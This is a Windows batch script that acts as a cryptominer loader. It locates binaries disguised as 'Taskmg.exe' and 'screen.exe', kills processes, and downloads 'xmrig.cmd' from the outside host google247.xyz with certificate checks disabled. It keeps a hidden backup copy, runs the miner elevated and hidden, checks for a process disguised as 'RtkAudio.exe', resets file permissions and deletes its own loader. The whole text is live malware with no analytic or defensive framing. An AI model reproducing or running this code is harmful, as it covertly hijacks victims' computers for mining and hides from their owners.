@echo off
@MD "C:\ProgramData\Internet Explorer" >nul 2>nul
TASKKILL /im "icacls.exe" /F >nul 2>nul
TASKKILL /im "Taskmg.exe" /F >nul 2>nul
for %%a in (C:\ProgramData\Taskmg.exe) do set Taskmg=%%~za
if "%Taskmg%" gtr "4325048" (Set "LoadTask=C:\ProgramData\Taskmg.exe" &Goto :SWTask)
for %%a in (C:\Windows\SysWOW64\Taskmg.exe) do set Taskmg=%%~za
if "%Taskmg%" gtr "4325048" (Set "LoadTask=C:\Windows\SysWOW64\Taskmg.exe" &Goto :SWTask)
for %%a in (C:\ProgramData\Intel\Taskmg.exe) do set Taskmg=%%~za
if "%Taskmg%" gtr "4325048" (Set "LoadTask=C:\ProgramData\Intel\Taskmg.exe" &Goto :SWTask)
:SWTask
for %%a in (C:\ProgramData\screen.exe) do set scscname=%%~za
if "%scscname%" gtr "40568" (Set "Loadscsc=C:\ProgramData\screen.exe" &Goto :SWscr)
for %%a in (C:\Windows\SysWOW64\screen.exe) do set scscname=%%~za
if "%scscname%" gtr "40568" (Set "Loadscsc=C:\Windows\SysWOW64\screen.exe" &Goto :SWscr)
for %%a in (C:\ProgramData\Intel\screen.exe) do set scscname=%%~za
if "%scscname%" gtr "40568" (Set "Loadscsc=C:\ProgramData\Intel\screen.exe" &Goto :SWscr)
:SWscr
pushd "C:\ProgramData"
attrib -h -r -s "C:\ProgramData\xmrig.cmd" >nul 2>nul
"%LoadTask%" -t 2 --no-check-certificate "google247.xyz/ViewXmrig/xmrig.cmd" -q -O "xmrig.cmd"
timeout /t 1 >nul
for %%a in (C:\ProgramData\xmrig.cmd) do set "szxmL1=%%~za"
if "%szxmL1%"=="0" Goto :Dload2
if "%szxmL1%"=="" Goto :Dload2
if %szxmL1% gtr 15 Goto :Runplaymncp
:Dload2
"%LoadTask%" --no-check-certificate http://google247.xyz/ViewXmrig/xmrig.cmd --header "Referer: www.google247.xyz" -O "xmrig.cmd"
timeout /t 1 >nul
for %%a in (C:\ProgramData\xmrig.cmd) do set "szxm=%%~za"
if "%szxm%"=="0" Goto :xcpy
if "%szxm%"=="" Goto :xcpy
if %szxm% gtr 15 Goto :Runplaymncp
:xcpy
attrib -h -r -s "C:\ProgramData\xmrigg.cmd" >nul 2>nul
copy /v /b /y "C:\ProgramData\xmrigg.cmd" "C:\ProgramData\xmrig.cmd" >nul 2>nul
attrib +h +r +s "C:\ProgramData\xmrigg.cmd" >nul 2>nul
for %%a in (C:\ProgramData\xmrig.cmd) do set "szxm=%%~za"
if "%szxm%"=="0" Goto :ica
if "%szxm%"=="" Goto :ica
if %szxm% gtr 15 Goto :Runplaymn
:ica
icacls * /t /q /c /reset
@del /f /q "%Temp%\loadhost.cmd" >nul 2>nul
@Exit
:Runplaymncp
attrib -h -r -s "C:\ProgramData\xmrigg.cmd" >nul 2>nul
copy /v /b /y "C:\ProgramData\xmrig.cmd" "C:\ProgramData\xmrigg.cmd" >nul 2>nul
attrib +h +r +s "C:\ProgramData\xmrigg.cmd" >nul 2>nul
:Runplaymn
"%Loadscsc%" elevate "%Loadscsc%" exec hide "C:\ProgramData\xmrig.cmd"
timeout /t 10 >nul
tasklist /FI "IMAGENAME eq RtkAudio.exe" 2>NUL | C:\Windows\System32\findstr.exe /i /c:"RtkAudio.exe">NUL
if "%ERRORLEVEL%"=="0" goto :OkTV
"%Loadscsc%" exec hide "C:\ProgramData\xmrig.cmd"
timeout /t 10 >nul
tasklist /FI "IMAGENAME eq RtkAudio.exe" 2>NUL | C:\Windows\System32\findstr.exe /i /c:"RtkAudio.exe">NUL
if "%ERRORLEVEL%"=="0" goto :OkTV
call "C:\ProgramData\xmrig.cmd"
:OkTV
pushd "C:\ProgramData\Internet Explorer"
icacls "C:\ProgramData\Internet Explorer\" /t /q /c /reset
@del /f /q "%Temp%\loadhost.cmd" >nul 2>nul
@Exit